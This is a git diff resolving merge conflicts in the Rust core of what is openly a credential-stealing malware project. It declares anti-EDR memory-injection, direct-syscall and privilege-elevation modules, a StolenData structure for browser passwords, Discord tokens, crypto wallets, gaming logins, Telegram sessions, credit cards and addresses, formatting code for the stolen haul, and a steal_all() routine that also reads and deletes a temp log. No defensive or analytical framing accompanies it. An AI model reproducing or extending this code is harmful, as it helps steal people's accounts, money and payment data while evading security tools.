@@ -6,18 +6,12 @@ pub mod discord;
 pub mod edge_injection;
 pub mod elevation_service;
 pub mod extension_installer;
-<<<<<<< HEAD
 pub mod firefox;
 pub mod gaming;
 pub mod memory_injection; // ← Memory injection anti-EDR
 pub mod syscalls; // ← Direct syscalls
 pub mod telegram;
 pub mod wallets; // ✅ RE-HABILITADO con GUIDs ofuscados en runtime
-=======
-pub mod memory_injection;  // ← Memory injection anti-EDR
-pub mod syscalls;           // ← Direct syscalls
-pub mod elevation_service;  //  RE-HABILITADO con GUIDs ofuscados en runtime
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
 use std::error::Error;
 use std::fmt;
@@ -78,11 +72,7 @@ pub struct StolenData {
     pub telegram: Vec<telegram::TelegramSession>,
     pub credit_cards: Vec<autofill::CreditCard>,
     pub addresses: Vec<autofill::AutofillAddress>,
-<<<<<<< HEAD
     pub debug_log: String, // 🔍 Debug logs para diagnóstico
-=======
-    pub debug_log: String,  //  Debug logs para diagnóstico
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 }
 
 impl StolenData {
@@ -100,7 +90,6 @@ impl StolenData {
     }
 
     pub fn is_empty(&self) -> bool {
-<<<<<<< HEAD
         self.credentials.is_empty()
             && self.discord_tokens.is_empty()
             && self.wallets.is_empty()
@@ -118,35 +107,12 @@ impl StolenData {
             + self.telegram.len()
             + self.credit_cards.len()
             + self.addresses.len()
-=======
-        self.credentials.is_empty() &&
-        self.discord_tokens.is_empty() &&
-        self.wallets.is_empty() &&
-        self.gaming.is_empty() &&
-        self.telegram.is_empty() &&
-        self.credit_cards.is_empty() &&
-        self.addresses.is_empty()
-    }
-
-    pub fn total_count(&self) -> usize {
-        self.credentials.len() +
-        self.discord_tokens.len() +
-        self.wallets.len() +
-        self.gaming.len() +
-        self.telegram.len() +
-        self.credit_cards.len() +
-        self.addresses.len()
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     }
 
     pub fn to_string(&self) -> String {
         let mut output = String::new();
 
-<<<<<<< HEAD
         // 🔍 DEBUG: Mostrar logs de diagnóstico al principio
-=======
-        //  DEBUG: Mostrar logs de diagnóstico al principio
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         if !self.debug_log.is_empty() {
             output.push_str("\n DEBUG LOG (Credit Cards)\n");
             output.push_str("═══════════════════════════════════════\n");
@@ -156,14 +122,10 @@ impl StolenData {
 
         // Credenciales de browsers
         if !self.credentials.is_empty() {
-<<<<<<< HEAD
             output.push_str(&format!(
                 "\n🌐 BROWSER CREDENTIALS ({})\n",
                 self.credentials.len()
             ));
-=======
-            output.push_str(&format!("\n BROWSER CREDENTIALS ({})\n", self.credentials.len()));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             output.push_str("═══════════════════════════════════════\n");
             for (idx, cred) in self.credentials.iter().enumerate() {
                 output.push_str(&format!("\n[#{}] ", idx + 1));
@@ -173,14 +135,10 @@ impl StolenData {
 
         // Discord tokens
         if !self.discord_tokens.is_empty() {
-<<<<<<< HEAD
             output.push_str(&format!(
                 "\n\n💬 DISCORD TOKENS ({})\n",
                 self.discord_tokens.len()
             ));
-=======
-            output.push_str(&format!("\n\n DISCORD TOKENS ({})\n", self.discord_tokens.len()));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             output.push_str("═══════════════════════════════════════\n");
             for (idx, token) in self.discord_tokens.iter().enumerate() {
                 output.push_str(&format!("[#{}] {}\n", idx + 1, token.to_string()));
@@ -199,14 +157,10 @@ impl StolenData {
 
         // Gaming Credentials
         if !self.gaming.is_empty() {
-<<<<<<< HEAD
             output.push_str(&format!(
                 "\n\n🎮 GAMING CREDENTIALS ({})\n",
                 self.gaming.len()
             ));
-=======
-            output.push_str(&format!("\n\n GAMING CREDENTIALS ({})\n", self.gaming.len()));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             output.push_str("═══════════════════════════════════════\n");
             for (idx, game) in self.gaming.iter().enumerate() {
                 output.push_str(&format!("\n[#{}] ", idx + 1));
@@ -216,14 +170,10 @@ impl StolenData {
 
         // Telegram Sessions
         if !self.telegram.is_empty() {
-<<<<<<< HEAD
             output.push_str(&format!(
                 "\n\n💬 TELEGRAM SESSIONS ({})\n",
                 self.telegram.len()
             ));
-=======
-            output.push_str(&format!("\n\n TELEGRAM SESSIONS ({})\n", self.telegram.len()));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             output.push_str("═══════════════════════════════════════\n");
             for (idx, session) in self.telegram.iter().enumerate() {
                 output.push_str(&format!("\n[#{}] ", idx + 1));
@@ -233,14 +183,10 @@ impl StolenData {
 
         // Credit Cards
         if !self.credit_cards.is_empty() {
-<<<<<<< HEAD
             output.push_str(&format!(
                 "\n\n💳 CREDIT CARDS ({})\n",
                 self.credit_cards.len()
             ));
-=======
-            output.push_str(&format!("\n\n CREDIT CARDS ({})\n", self.credit_cards.len()));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             output.push_str("═══════════════════════════════════════\n");
             for (idx, card) in self.credit_cards.iter().enumerate() {
                 output.push_str(&format!("\n[#{}] ", idx + 1));
@@ -250,14 +196,10 @@ impl StolenData {
 
         // Autofill Addresses
         if !self.addresses.is_empty() {
-<<<<<<< HEAD
             output.push_str(&format!(
                 "\n\n📍 AUTOFILL ADDRESSES ({})\n",
                 self.addresses.len()
             ));
-=======
-            output.push_str(&format!("\n\n AUTOFILL ADDRESSES ({})\n", self.addresses.len()));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             output.push_str("═══════════════════════════════════════\n");
             for (idx, address) in self.addresses.iter().enumerate() {
                 output.push_str(&format!("\n[#{}] ", idx + 1));
@@ -328,7 +270,6 @@ pub fn steal_all() -> StolenData {
     let mut credit_cards = autofill::steal_credit_cards_hybrid();
     data.credit_cards.append(&mut credit_cards);
 
-<<<<<<< HEAD
     // 🔍 DEBUG: Leer log file si existe
     let debug_log_path = std::env::temp_dir().join("stealer_debug.txt");
     data.debug_log.push_str(&format!(
@@ -339,25 +280,14 @@ pub fn steal_all() -> StolenData {
         "🔍 DEBUG: Archivo existe: {}\n",
         debug_log_path.exists()
     ));
-=======
-    //  DEBUG: Leer log file si existe
-    let debug_log_path = std::env::temp_dir().join("stealer_debug.txt");
-    data.debug_log.push_str(&format!(" DEBUG: Buscando log en: {:?}\n", debug_log_path));
-    data.debug_log.push_str(&format!(" DEBUG: Archivo existe: {}\n", debug_log_path.exists()));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     if debug_log_path.exists() {
         match std::fs::read_to_string(&debug_log_path) {
             Ok(log_content) => {
-<<<<<<< HEAD
                 data.debug_log
                     .push_str("🔍 DEBUG: Log leído correctamente\n");
                 data.debug_log
                     .push_str("════════════════════════════════\n");
-=======
-                data.debug_log.push_str(" DEBUG: Log leído correctamente\n");
-                data.debug_log.push_str("════════════════════════════════\n");
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                 data.debug_log.push_str(&log_content);
                 data.debug_log
                     .push_str("════════════════════════════════\n");
@@ -365,7 +295,6 @@ pub fn steal_all() -> StolenData {
                 let _ = std::fs::remove_file(&debug_log_path);
             }
             Err(e) => {
-<<<<<<< HEAD
                 data.debug_log
                     .push_str(&format!("🔍 DEBUG: Error leyendo log: {}\n", e));
             }
@@ -375,14 +304,6 @@ pub fn steal_all() -> StolenData {
             .push_str("🔍 DEBUG: Archivo de log no existe\n");
         data.debug_log
             .push_str("🔍 DEBUG: Esto significa que steal_credit_cards() no escribió nada\n");
-=======
-                data.debug_log.push_str(&format!(" DEBUG: Error leyendo log: {}\n", e));
-            }
-        }
-    } else {
-        data.debug_log.push_str(" DEBUG: Archivo de log no existe\n");
-        data.debug_log.push_str(" DEBUG: Esto significa que steal_credit_cards() no escribió nada\n");
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     }
 
     // Autofill Addresses
